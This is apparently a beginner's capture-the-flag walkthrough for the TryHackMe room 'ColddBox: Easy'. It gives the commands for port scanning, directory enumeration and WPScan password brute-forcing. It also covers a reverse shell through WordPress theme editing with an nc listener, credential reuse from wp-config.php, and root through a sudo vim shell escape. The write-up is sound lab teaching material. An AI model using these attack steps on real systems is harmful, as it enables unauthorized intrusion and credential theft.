# ColddBox: Easy — Walkthrough [TryHackMe](https://tryhackme.com/room/colddboxeasy)

## Introduction
ColddBox: Easy is a beginner-friendly TryHackMe room focused on WordPress exploitation, enumeration, and basic privilege escalation. A great starting point for those diving into web and Linux-based CTFs.

## Scanning
```python
nmap -p- -sC -sV 10.10.121.22
```
Results:
```python
80/tcp — HTTP (Apache 2.4.18, WordPress 4.1.31)
4512/tcp — SSH
```
## Gobuster
```python
gobuster dir -u http://10.10.121.22 -w /usr/share/wordlists/dirb/common.txt -t 50 -x php,html,txt
```
Interesting results:
```python
/hidden
/wp-admin
/wp-login.php
/wp-config.php
```
Inside /hidden, I found this message:
```python
U-R-G-E-N-T
C0ldd, you changed Hugo's password, when you can send it to him so he can continue uploading his articles. Philip
```
## WPScan — Brute Forcing
```python
wpscan --url http://10.10.121.22/ -eu -P /usr/share/wordlists/rockyou.txt
```
I successfully brute-forced the password for c0ldd.

## Getting a Reverse Shell
1. Log into the WordPress admin panel.

2. Go to Appearance > Theme Editor > 404 Template.

3. Replace the content with a PHP reverse shell.

4. On your attacker machine:
```python
nc -lvnp 4444
```
5. Trigger the shell by visiting:
```python
http://10.10.121.22/wp-content/themes/twentyfifteen/404.php
```
Reverse shell acquired.

## SSH Access
Inside the shell, navigate to /var/www/html and read wp-config.php:
```python
define('DB_USER', 'c0ldd');
define('DB_PASSWORD', '********');
```
Use the credentials:
```python
ssh c0ldd@10.10.121.22 -p 4512
```
Now we have full shell access as c0ldd and can read user.txt.

## Privilege Escalation
Check sudo permissions:
```python
sudo -l
```
We can run:
```python
(root) /usr/bin/vim
(root) /bin/chmod
(root) /usr/bin/ftp
```
We exploit vim to get root:
```python
sudo vim -c ':!/bin/sh'
```
We're root. Grab the flag:
```python
cat /root/root.txt
```
Conclusion

In this write-up, I describe how I exploited ColdBox. Easy!
machine by exploiting weak user passwords.

